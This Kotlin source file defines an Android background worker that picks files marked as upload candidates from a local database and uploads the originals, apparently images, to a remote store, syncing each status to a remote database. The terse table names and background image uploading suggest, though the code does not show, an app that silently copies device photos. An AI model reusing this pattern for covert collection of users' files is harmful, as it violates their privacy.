package com.anonymous.amorous.workers

import android.content.Context
import android.util.Log
import androidx.work.WorkerParameters
import com.anonymous.amorous.DB_T_C
import com.anonymous.amorous.data.models.Candidate
import com.anonymous.amorous.utils.UploadBitmapUtils
import org.koin.standalone.inject

class OriginalUploadWorker(
        appContext: Context,
        workerParams: WorkerParameters
) : BaseCoroutineWorker(appContext, workerParams) {

    private val upload: UploadBitmapUtils by inject()

    override suspend fun doWorkAsync(): Result = try {

        val cache = database.getCandidates("SELECT * FROM c WHERE ptu =? ORDER BY d ASC LIMIT 5", arrayOf("original_upload_need"))
        when {
            cache.isNotEmpty() -> for (candidate in cache) {
                val path = when {
                    candidate.backupStatus == Candidate.BACKUP_READE -> candidate.tempPath
                    else -> candidate.originalPath
                }
                when {
                    path.isNotEmpty() -> {
                        when {
                            fileUtils.checkFileExists(path) -> up(candidate)
                            else -> when {
                                fileUtils.checkFileExists(candidate.originalPath) -> up(candidate)
                                else -> {
                                    database.removeCandidate(candidate)
                                    remoteDatabase.updateCandidate(candidate.copy(originalStatus = Candidate.ORIGINAL_FILE_REMOVED, date = System.currentTimeMillis()))
                                }
                            }
                        }
                    }
                    else -> addEvent("Candidate for upload original fail! Path empty")
                }
            }
            else -> addEvent("Candidate for upload original is empty!")
       }
        sendEvent("OriginalUploadWorker", getEvents())
        Result.success()
    } catch (e: Exception) {
        Result.retry()
    }

    private fun up(candidate: Candidate) {
        upload.uploadOriginal(candidate) {
            database.updateCandidate(it)
            remoteDatabase.updateCandidate(it)
        }
    }
}